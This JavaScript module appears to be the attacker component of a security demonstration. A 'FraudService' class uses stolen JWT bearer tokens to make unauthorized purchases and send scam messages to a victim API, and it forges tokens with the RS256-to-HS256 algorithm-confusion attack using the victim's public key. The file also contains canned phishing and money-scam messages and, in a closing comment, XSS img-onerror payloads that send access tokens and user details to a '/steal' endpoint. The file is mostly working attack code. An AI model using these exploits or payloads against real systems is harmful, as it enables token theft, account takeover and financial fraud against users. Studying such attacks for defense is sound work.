import { inspect } from 'node:util';
import * as jose from 'jose';
import jwt from 'jsonwebtoken';

const FRADULENT_MESSAGES = [
  `Omg 😢 did you see who died? You knew her, right? \n <a href="https://shocking-news-site[.]com/death123.html">https://shocking-news-site[.]com/death123.html</a>`,
  `I'm so sorry to hear that. 😢 \n <a href="https://shocking-news-site[.]com/death123.html">https://shocking-news-site[.]com/death123.html</a>`,
  `💼 We're hiring remote software devs ($3,000/month, flexible hours). Apply here 👉 \n <a href="https://shocking-news-site[.]com/death123.html">https://shocking-news-site[.]com/death123.html</a>`,
  `Hey, can you help me out real quick? I'm stuck and need $50 for Uber. I'll pay you back today. \n Venmo me @john-fast`,
  `Hey, I'm really stuck right now. Could you lend me $100? Will pay back immediately! \n Send to @john-fast on CashApp`,
  `Having an emergency - would you be able to send $200? Promise to return it right away \n @john-fast is my CashApp`,
  `In a difficult situation... Can anyone help with $300? Will definitely repay you ASAP \n CashApp: @john-fast`,
  `I just made $900 in 2 hours with this trading bot — no risk! Join here: \n <a href="https://profit-bot247[.]net">https://profit-bot247[.]net</a>`,
];

// Simulated victim's public RSA key used as HMAC secret (this is the trick)
// ⚠️ If a server uses RS256 for JWTs, it must share its public key to allow verification (e.g., by clients, identity providers, or federated systems).
// ⚠️ The public key is often deliberately exposed — and attackers can download it from places like:
// •	A /.well-known/jwks.json endpoint (JWKS = JSON Web Key Set)
// •	An OAuth/OpenID provider’s discovery URL
// •	Hardcoded into frontend applications (e.g., in React or mobile apps)
// •	Publicly shared over email or documentation (for integration)
const victimPublicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo3BNo4ZQEelQvK0m5Gkb
5vwyA5PE267YpdRy2NsWVhBb2M2Hr3yofLmOIoRurDy7YUnaocL758IyPbcY8CA8
VhpBh8papT/J49HnPIvMob0Gy0VeYJ3zSxig59e6Yq+BPBXUlNsgvf9ckQ9H1EBS
G+5LBklntCuLmKGOxgnXi3FxXuEcL7klZGo0yogKq6spN7nl2iNz0r8oc0uYuU8i
+zqQ+5KBoPbLvCbWtHrYRweBCyT5lRpHsgoMEhQV9Xk2M/ZkVHFh17b9q68I/2oB
wJfItmEBJNLlPgtCljspyL9P4N5qSEmCDLE8ODnapveTboAXhdYFTUq9YTRnPdtN
9wIDAQAB
-----END PUBLIC KEY-----`;

class FraudService {
  static #instance;

  constructor() {
    if (FraudService.#instance) {
      return FraudService.#instance;
    }
    FraudService.#instance = this;
  }

  /**
   * Attempts to make a fraudulent payment using a stolen authentication token
   * @param {string} token - The stolen authentication token to use
   *
   * This method:
   * 1. Delays execution by 1 second to simulate real-world timing
   * 2. Makes a POST request to the victim's booking endpoint
   * 3. Uses the stolen token in the Authorization header
   * 4. Logs success or failure of the attempt
   */
  attemptFraudulentPayment(token) {
    // Add delay to make the fraud attempt less suspicious
    setTimeout(async () => {
      console.log('Attempting fraudulent payment...');
      try {
        // Make POST request to victim's booking endpoint
        const response = await fetch(
          `${process.env.VICTIM_API_BASE_URL}/products/book`,
          {
            method: 'POST',
            timeout: 30000,
            headers: {
              // Include stolen token in Authorization header
              Authorization: `Bearer ${token}`,
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              productId: process.env.VICTIM_PRODUCT_ID,
            }),
          }
        );
        const data = await response.json();
        if (!response.ok || !data.productKey) {
          console.log('Payment failed or product key not found', inspect(data));
          throw new Error('Payment failed or product key not found');
        }
        console.log(
          'Payment attempted with stolen token!!! Product key: ',
          inspect(data.productKey)
        );
      } catch (error) {
        // Log any errors that occur during the fraud attempt
        console.error('Error making payment:', error);
      }
    }, 1000); // 1 second delay
  }

  sendMessages(token, msgCount = 1) {
    // console.log('-----------SEND FRAUDULENT MESSAGES TO VICTIM API...');
    for (let i = 1; i <= msgCount; i++) {
      this.sendMessage(token, i * 1000);
    }
  }

  /**
   * Sends a random fraudulent message to the victim's chat endpoint using a stolen authentication token
   * @param {string} token - The stolen authentication token to use
   *
   * This method:
   * 1. Delays execution by 1 second to simulate real-world timing
   * 2. Makes a POST request to the victim's chat endpoint
   * 3. Uses the stolen token in the Authorization header
   * 4. Sends a random message from FRADULENT_MESSAGES
   * 5. Logs success or failure of the attempt
   */
  sendMessage(token, delay = 1000) {
    console.log(
      `Attempting to send fraudulent message in ${(delay / 1000).toFixed(1)}s...`
    );
    setTimeout(async () => {
      console.debug('Sending fraudulent message...');
      try {
        // Pick a random message
        const message =
          FRADULENT_MESSAGES[
            Math.floor(Math.random() * FRADULENT_MESSAGES.length)
          ];
        // Make POST request to victim's chat endpoint
        const response = await fetch(
          `${process.env.VICTIM_API_BASE_URL}/chat/messages`,
          {
            method: 'POST',
            headers: {
              Authorization: `Bearer ${token}`,
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              text: message,
            }),
          }
        );
        const data = await response.json();
        if (!response.ok) {
          console.log('Message sending failed', inspect(data));
          throw new Error('Message sending failed');
        }
        console.log('Fraudulent message sent! Response:', inspect(data));
      } catch (error) {
        console.error('Error sending fraudulent message:', inspect(error));
      }
    }, delay);
  }

  /**
   * Decodes and inspects the victim's JWT token
   * @param {string} token - The stolen JWT token to decode
   * @returns {Object} The decoded JWT payload containing user claims
   *
   * This method:
   * 1. Uses jose library to decode (but not verify) the JWT
   * 2. Logs the decoded payload for inspection
   * 3. Returns the decoded payload object
   */
  decodeVictimJWT(token) {
    const payload = jose.decodeJwt(token);
    console.log('Decoded Victim JWT:', inspect(payload));
    return payload;
  }

  /**
   * Creates a fraudulent JWT token based on a stolen valid token
   * @param {string} token - The stolen valid JWT token to base the fraud on
   * @returns {Promise<string>} A new fraudulent JWT token
   *
   * This method:
   * 1. Decodes the stolen token to get its payload
   * 2. Creates a new token with:
   *    - Same payload claims as original
   *    - Extended expiration (30 days)
   *    - Signed with victim's public key (which should be private!)
   * 3. Uses HS256 algorithm which is vulnerable when public key is known
   * 4. Logs and returns the fraudulent token
   *
   * Security note: This exploits improper key management and
   * algorithm validation on the victim's server
   */
  async buildFraudulentJWT(token) {
    const payload = jose.decodeJwt(token);

    const fraudulentToken = jwt.sign(
      { ...payload, exp: Math.floor(Date.now() / 1000) + 3600 * 24 * 30 },
      victimPublicKey,
      {
        algorithm: 'HS256',
      }
    );

    console.log('🧨 Fraudulent token:', inspect(fraudulentToken));

    return fraudulentToken;
  }
}

export default new FraudService();

/**

<img src="x" onerror="
  const token = localStorage.getItem('accessToken');
  (new Image()).src = 'http://localhost:4500/steal?token=' + token;
">
  
<img src="x" onerror="
  const token = localStorage.getItem('accessToken');
  (new Image()).src = 'http://localhost:4500/steal?token=' + encodeURIComponent(token)+'&email='+encodeURIComponent(document.querySelector('.user-link')?.getAttribute('href')?.replace('mailto:', ''))+'&name='+encodeURIComponent(document.querySelector('.user-link')?.textContent?.trim());
"> 

*/
